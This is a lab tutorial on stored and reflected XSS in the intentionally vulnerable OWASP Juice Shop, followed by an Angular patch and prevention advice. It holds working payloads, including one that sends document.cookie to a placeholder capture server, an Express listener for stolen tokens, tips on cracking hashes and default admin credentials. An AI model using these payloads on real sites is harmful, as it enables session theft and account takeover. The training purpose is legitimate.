## A07:2017 - Cross-Site Scripting (XSS)
[Cross-Site Scripting](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)  is a prevalent security flaw that enables attackers to inject harmful scripts into content that's then presented to other users. By exploiting such vulnerabilities, attackers can assume control over user actions, steal confidential information, or tamper with user interactions with an application. XSS attacks primarily come in three varieties:

1. **Stored XSS**: Where the injected script is permanently stored on the server, affecting subsequent visitors.
2. **Reflected XSS**: Where the injected script is reflected off a web request immediately back to the browser.
3. **DOM-Based XSS**: Where the script executes due to changes in the browser's DOM, but the payload isn't actually sent to the server.

In this tutorial, we focus on Stored and Reflected XSS to build a basic understanding of these vulnerabilities. We'll explore how to capture a user's credentials by exploiting XSS in the OWASP Juice Shop.

## Set Up Your Account

First, you need to set up your environment in Juice Shop:

**Register a new account** using dummy credentials for testing purposes. Here's an example:

```
Email: test@test.com
Password: password
```

## Uncovering XSS Vulnerabilities

Let's use the Juice Shop's search feature to test for XSS vulnerabilities:

**Identify a Test Payload**: Start with a simple payload to test if the application is vulnerable to XSS. For example, input the following into a search field:

```
<img src=x onerror=alert('XSS')>
```

This snippet attempts to load an invalid image, triggering an error, and an alert box. If you see the alert, it confirms the vulnerability.

![xss-found](https://github.com/jmr54/Website-Security-Research/assets/29048308/6514d54c-4cd9-41dd-b146-faf312db437d)

## Capturing Sensitive Information

Having the ability to run scripts in the browser, we can now craft a payload to uncover sensitive data, like JWTs used for authentication.

1. **Craft a Data Extraction Payload**: Modify the initial payload to capture the JWT:
```
<img src=x onerror=alert(document.cookie)>
```

Executing this will display the session cookie, which you can inspect to find the JWT.

![cookie-exposed](https://github.com/jmr54/Website-Security-Research/assets/29048308/d7f49cb3-50bd-405b-ae04-4da3920ef141)


2. **Decode the JWT**: Use [JWT.io](https://jwt.io/) to decode the token, revealing the user's details. To crack any hashed information like passwords, you might use a hash decryption service found via a simple web search.

![decode-jwt](https://github.com/jmr54/Website-Security-Research/assets/29048308/8820aa85-26d0-427e-bc0d-20ebfcb8e5c8)

![decode-pw-1](https://github.com/jmr54/Website-Security-Research/assets/29048308/1a53b6b5-fbde-4c70-871a-e565d3edbd07)

![decode-pw-2](https://github.com/jmr54/Website-Security-Research/assets/29048308/e271fbae-de0e-40ab-842c-cd35b5944c61)

## Setting Up a Listener

To capture data stealthily, you'll need a server to collect the JWTs from users:

1. **Prepare Your Capture Server**:  Ensure you have Node.js and Express installed. Use the following basic server setup and run it using ```npm start```. 

```
// Sample Node.js server to capture data
const express = require('express');
const app = express();

app.get('/capture', (req, res) => {
  console.log('Data captured:', req.query.data);
  res.status(200).send('Data captured');
});

app.listen(9000, () => console.log('Server listening on port 9000'));
```

Keep this server running as you proceed.

![server-running](https://github.com/jmr54/Website-Security-Research/assets/29048308/3148064f-c254-4876-bf1b-8fa528491efb)

## Implementing the XSS Attack

Now, you're ready to craft a link that will send the user's JWT to your capture server when clicked:

1. **Prepare the Malicious Payload**: Within your test account, input the following into the Juice Shop's search:

```
<img src=https://github.com/favicon.ico onload=this.src='http://your-server-address:9000/capture?data='+document.cookie>
```
Replace your-server-address with the actual address of your capture server. Enter the payload in search, and you'll notice the server logs the JWT token:

![token-logged](https://github.com/jmr54/Website-Security-Research/assets/29048308/e23aeb72-a2d4-4781-97b6-9ca66390b0fd)

2. **Embed the Payload in Juice Shop**: Create a product review containing the malicious code, then log out.

![post-malicious-review](https://github.com/jmr54/Website-Security-Research/assets/29048308/5c23cea6-4f37-4525-a0fe-3a570c142970)

4. **Trigger the Payload**: Imagine you're an unsuspecting user who logs in and views product reviews. When you try to search the link contained in the review, the cookie data is sent to your capture server. Try this with another account. You can create another account or use the admin account:
```
Username: admin@juice-sh.op
Password: admin123
```
4. **Capture and Decode Information**: Review your capture server's logs to find the captured JWT. Decode it as before to extract sensitive information for the targeted user.

![data_captured](https://github.com/jmr54/Website-Security-Research/assets/29048308/46ca65e9-8c6b-4d77-84f0-bc830039dac5)

# Securing Juice Shop Against XSS

## XSS and the Role of Web Frameworks

From [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html): 

> For XSS attacks to be successful, an attacker needs to insert and execute malicious content in a webpage. Each variable in a web application needs to be protected. Ensuring that all variables go through validation and are then
> escaped or sanitized is known as perfect injection resistance. Any variable that does not go through this process is a potential weakness. Frameworks make it easy to ensure variables are correctly validated and escaped or sanitised.

## The Misuse of Angular in Juice Shop

A prime example of framework misuse can be found in the Juice Shop project, which we know is intentionally vulnerable. Juice Shop, built using Angular, demonstrates the misuse of the `bypassSecurityTrustAs` method in its `search-result.component.ts` file. Although the vulnerability is highlighted in the comments, it can be an oversight that can lead to severe XSS vulnerabilities.

<img width="1407" alt="vulnerable_snippet_1" src="https://github.com/jmr54/Website-Security-Research/assets/29048308/2187812f-96c2-4247-b8d1-60d1c5dd6ace">

<img width="1322" alt="vulnerable_snippet_2" src="https://github.com/jmr54/Website-Security-Research/assets/29048308/1f1e9f5a-bffd-470b-8f3d-5d0f774aa77c">

## Understanding Angular's DomSanitizer

Angular's `DomSanitizer` is a powerful tool designed to prevent XSS by sanitizing values to be safe to use in the different DOM contexts. However, using `bypassSecurityTrust...` APIs can disable this built-in sanitization, introducing potential security risks. As per Angular's official documentation:

> "Calling any of the bypassSecurityTrust... APIs disables Angular's built-in sanitization for the value passed in. Carefully check and audit all values and code paths going into this call. Make sure any user data is appropriately escaped for this security context."

## Patching Juice Shop

In the [Juice-Shop-Secure](../Juice-Shop-Secure) directory, you'll find the patch for this vulnerability in [search-result.component.ts](../Juice-Shop-Secure/frontend/src/app/search-result/search-result.component.ts) file. Here, we simply remove the ```bypassSecurityTrustHtml``` line to ensure the search query is sanitized properly. This is the result after we make the change and try to run this XSS attack ```<img src=x onerror=alert('XSS')>```:

<img width="1765" alt="xss_patch" src="https://github.com/jmr54/Website-Security-Research/assets/29048308/ae4c2cf3-628f-44f4-bed6-b70c3fb9ec71">

NOTE: This single technique will not solve XSS across the entire application. You must a use combination of techniques to provide full defense.

## Best Practices for XSS Prevention

1. **Avoid Bypassing Security**: Unless absolutely necessary, avoid using methods that bypass Angular's security features. If you must use them, ensure thorough auditing and validation of the data.
2. **Validate and Sanitize Input**: Always validate and sanitize user inputs to ensure they do not contain harmful scripts.
3. **Stay Informed**: Regularly consult resources like the OWASP Cheat Sheets to stay updated on best practices and emerging threats.
4. **Code Auditing**: Regularly audit your code for potential vulnerabilities, especially when using functions known to introduce risks.

## Further Reading and Resources

- [Angular's Official Guide on Security](https://angular.io/guide/security)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
